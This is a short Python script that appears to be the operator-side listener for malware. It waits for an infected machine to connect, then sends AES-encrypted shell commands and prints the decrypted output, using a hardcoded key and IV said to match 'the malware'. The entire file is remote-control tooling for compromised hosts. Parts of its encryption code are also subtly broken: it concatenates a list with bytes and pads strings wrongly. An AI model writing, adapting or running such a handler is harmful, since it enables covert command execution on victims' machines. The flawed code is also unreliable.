import socket
from Crypto.Cipher import AES
import base64

# Get port from user
port = int(input("Enter the port to listen on: "))

# AES Encryption Setup (Use the same key & IV from the malware)
KEY = [71, 217, 251, 172, 62, 164, 205, 13, 114, 120, 11, 212, 199, 117, 138, 6] 

IV = [181, 58, 152, 238, 53, 148, 148, 146, 19, 225, 189, 123, 67, 95, 132, 122]

def encrypt(msg):
    cipher = AES.new(bytes(KEY), AES.MODE_CBC, bytes(IV))
    return base64.b64encode(IV + cipher.encrypt(msg.ljust(16))).decode()

def decrypt(enc_msg):
    enc_msg = base64.b64decode(enc_msg)
    iv, enc_msg = enc_msg[:16], enc_msg[16:]
    cipher = AES.new(bytes(KEY), AES.MODE_CBC, iv)
    return cipher.decrypt(enc_msg).strip().decode()

# Start Listener
HOST = "0.0.0.0"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, port))
server.listen(1)

print(f"[*] Listening on {HOST}:{port}...")

client, addr = server.accept()
print(f"[+] Connection established from {addr}")

while True:
    cmd = input("Shell> ")
    if cmd.lower() in ["exit", "quit"]:
        client.send(encrypt("exit").encode())
        break

    client.send(encrypt(cmd).encode())  # Encrypt command
    response = decrypt(client.recv(4096).decode())  # Decrypt response
    print(response)

client.close()
server.close()

